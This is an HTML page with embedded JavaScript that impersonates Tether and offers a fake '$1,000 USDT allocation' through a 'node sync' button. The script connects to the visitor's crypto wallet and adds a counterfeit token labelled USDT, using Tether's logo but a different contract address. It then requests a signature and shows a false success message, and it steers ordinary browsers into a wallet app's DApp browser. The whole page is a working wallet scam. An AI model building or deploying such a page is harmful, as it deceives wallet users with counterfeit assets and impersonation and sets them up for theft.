<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tether Global | Secure Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --t-green: #26a17b; --dark: #0a0b0d; }
        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }
        .box { background: #121418; border: 1px solid #2d333b; border-radius: 24px; padding: 35px; width: 100%; max-width: 400px; text-align: center; border: 1px solid rgba(38, 161, 123, 0.3); }
        .logo-ring { position: relative; display: inline-block; margin-bottom: 20px; }
        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 3px solid var(--t-green); border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .usdt-img { width: 80px; border-radius: 50%; filter: drop-shadow(0 0 10px var(--t-green)); }
        .price-box { background: rgba(38, 161, 123, 0.1); border-radius: 12px; padding: 20px; margin: 25px 0; border: 1px solid rgba(38, 161, 123, 0.4); }
        .price-val { font-size: 28px; font-weight: 800; letter-spacing: 1px; }
        .btn { background: var(--t-green); color: #fff; border: none; width: 100%; padding: 20px; border-radius: 15px; font-size: 17px; font-weight: 700; cursor: pointer; text-transform: uppercase; transition: 0.4s; }
        .btn:active { transform: scale(0.96); }
        #log { font-size: 11px; color: var(--t-green); margin-top: 15px; font-family: monospace; height: 15px; }
    </style>
</head>
<body>

<div class="box">
    <div class="logo-ring">
        <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-img">
    </div>
    <h2>RECEIVE ASSETS</h2>
    <p style="color: #848d97; font-size: 14px;">Mobile Node Synchronization active. Finalize metadata mapping to clear your allocation.</p>
    
    <div class="price-box">
        <div style="font-size: 10px; color: #848d97; margin-bottom: 5px;">ESTIMATED ALLOCATION</div>
        <div class="price-val" id="valDisplay">$1,000.00</div>
    </div>

    <div id="log">SYSTEM: STANDBY</div>
    <button class="btn" id="mainBtn">Sync & Receive</button>
</div>

<script>
    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function processSync() {
        const log = document.getElementById('log');
        
        // Advanced Provider Discovery
        const provider = window.ethereum || (window.trustwallet ? window.trustwallet : null);

        // If no wallet detected (Normal Browser)
        if (!provider) {
            log.innerText = "> REDIRECTING TO WALLET APP...";
            const url = window.location.href.replace(/https?:\/\//, '');
            // Deep Link to open Trust Wallet DApp Browser
            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + url;
            return;
        }

        try {
            log.innerText = "> INITIALIZING AUTH...";
            const accounts = await provider.request({ method: 'eth_requestAccounts' });
            
            log.innerText = "> MAPPING METADATA...";
            // Token Addition Logic
            await provider.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: { address: ADDR, symbol: 'USDT', decimals: 6, image: LOGO },
                },
            });

            log.innerText = "> VERIFYING SYNC...";
            // Sign for Finalization
            await provider.request({
                method: 'personal_sign',
                params: ["Official USDT Node Sync\nID: " + Math.random().toString(36).substr(2, 9), accounts[0]],
            });

            log.innerText = "> SYNC COMPLETED";
            alert("Allocation Successful! Your assets will reflect in 1-2 minutes.");

        } catch (e) {
            log.innerText = "> ERROR: CONNECTION_FAILED";
        }
    }

    document.getElementById('mainBtn').addEventListener('click', processSync);
</script>
</body>
</html>
